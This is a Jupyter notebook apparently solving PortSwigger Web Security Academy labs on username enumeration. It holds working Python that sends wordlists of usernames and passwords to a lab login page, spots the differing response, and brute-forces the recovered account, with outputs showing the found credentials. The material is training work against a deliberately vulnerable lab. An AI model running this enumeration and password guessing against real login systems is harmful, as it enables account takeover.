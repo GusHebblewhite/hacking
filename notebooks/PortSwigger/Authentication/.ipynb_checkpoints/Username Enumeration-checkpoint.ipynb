{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "e31af6d8",
   "metadata": {
    "heading_collapsed": true
   },
   "source": [
    "# Different Responses\n",
    "- https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses\n",
    "- https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-subtly-different-responses\n",
    "\n",
    "Code here is written for the latter but it probably still works on the former. In any case it's very simple."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 51,
   "id": "237a3b65",
   "metadata": {
    "hidden": true
   },
   "outputs": [],
   "source": [
    "import requests\n",
    "from tqdm import tqdm\n",
    "import re"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 55,
   "id": "a435c16b",
   "metadata": {
    "hidden": true
   },
   "outputs": [],
   "source": [
    "URL = \"https://acec1fd41f471d6bc00759460018003f.web-security-academy.net/\"\n",
    "\n",
    "#Load list of usernames and passwords to try\n",
    "file_dir = \"../../../library/text_files/\"\n",
    "with open(file_dir + \"pw_list.txt\", 'r') as f:\n",
    "    passwords = [x.strip() for x in f.readlines()]\n",
    "with open(file_dir + \"uname_list.txt\", 'r') as f:\n",
    "    usernames = [x.strip() for x in f.readlines()]\n",
    "    \n",
    "#Start session\n",
    "s = requests.session()\n",
    "r = s.get(URL)\n",
    "\n",
    "if r.status_code == 504:\n",
    "    print(\"Env has timed out!\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 80,
   "id": "c00a03a6",
   "metadata": {
    "hidden": true
   },
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "100%|█████████████████████████████████████████████████████████████████████████████████| 101/101 [02:42<00:00,  1.61s/it]\n"
     ]
    }
   ],
   "source": [
    "# Enumerate Usernames\n",
    "\n",
    "response_log_un = {}\n",
    "\n",
    "def get_key(response_text):\n",
    "    #Clean unwanted variablility from response\n",
    "    variable_string = re.findall(r\"analytics\\?id.*/script\", response_text)[0]\n",
    "    key = response_text.replace(variable_string, \"\")\n",
    "    return key, variable_string\n",
    "    \n",
    "\n",
    "for each_uname in tqdm(usernames):\n",
    "    \n",
    "    #payload\n",
    "    data = {'username' : each_uname ,\n",
    "            'password' : 'test'}\n",
    "    \n",
    "    r = s.post(URL + \"login\", data=data)\n",
    "    \n",
    "    #Make sure no timeout\n",
    "    if r.status_code == 504:\n",
    "        print(\"Env has timed out!\")\n",
    "        \n",
    "    key, _ = get_key(r.text)\n",
    "\n",
    "    if key in response_log_un.keys():\n",
    "        response_log_un[key]['cnt'] += 1\n",
    "        response_log_un[key]['uname'].append(each_uname)\n",
    "    else:\n",
    "        response_log_un[key] = {'cnt' : 1, 'uname' : [each_uname, ]}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 83,
   "id": "5d9c660d",
   "metadata": {
    "hidden": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[53, 47, 1]"
      ]
     },
     "execution_count": 83,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "response_cnt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 82,
   "id": "8eb4cd86",
   "metadata": {
    "hidden": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['ae']"
      ]
     },
     "execution_count": 82,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "#Take first username\n",
    "response_cnt = [response_log_un[x]['cnt'] for x in response_log_un.keys()]\n",
    "min_cnt = min(response_cnt)\n",
    "valid_uname_arr = [\n",
    "    response_log_un[x]['uname'] for x in response_log_un.keys() if (response_log_un[x]['cnt'] == min_cnt)]\n",
    "valid_uname = valid_uname_arr[0]\n",
    "valid_uname"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 86,
   "id": "527555d1",
   "metadata": {
    "hidden": true
   },
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "100%|█████████████████████████████████████████████████████████████████████████████████| 100/100 [02:44<00:00,  1.64s/it]\n"
     ]
    }
   ],
   "source": [
    "response_log_pw = {}\n",
    "\n",
    "# Guess passwords\n",
    "for each_pw in tqdm(passwords):\n",
    "    \n",
    "    #payload\n",
    "    data = {'username' : valid_uname,\n",
    "            'password' : each_pw}\n",
    "    \n",
    "    r = requests.post(URL + \"login\", data=data)\n",
    "    \n",
    "    #Make sure no timeout\n",
    "    if r.status_code == 504:\n",
    "        print(\"Env has timed out!\")\n",
    "        \n",
    "    key, _ = get_key(r.text)\n",
    "    \n",
    "    #Check if response is unique\n",
    "    if key in response_log_pw.keys():\n",
    "        response_log_pw[key]['cnt'] += 1\n",
    "        response_log_pw[key]['pw'].append(each_pw)\n",
    "    else:\n",
    "        response_log_pw[key] = {'cnt' : 1, 'pw' : [each_pw, ]}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 87,
   "id": "3a3590ae",
   "metadata": {
    "hidden": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[39, 33, 1, 17, 10]\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "['aaaaaa']"
      ]
     },
     "execution_count": 87,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "#Validation\n",
    "print([response_log_pw[x]['cnt'] for x in response_log_pw.keys()])\n",
    "#Print password!\n",
    "min_cnt = min([response_log_pw[x]['cnt'] for x in response_log_pw.keys()])\n",
    "valid_pw_arr = [\n",
    "    response_log_pw[x]['pw'] for x in response_log_pw.keys() if (response_log_pw[x]['cnt'] == min_cnt)]\n",
    "valid_pw = valid_pw_arr[0]\n",
    "valid_pw"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "cd3eb8e0",
   "metadata": {
    "hidden": true
   },
   "source": [
    "Yay success.\n",
    "\n",
    "Note that from drilling into the responses the difference was that if the username is correct there is a full stop in the \"Your username or password is incorrect[.]\" text."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "24f3273d",
   "metadata": {},
   "source": [
    "# Timing Attacks\n",
    "https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "49082425",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
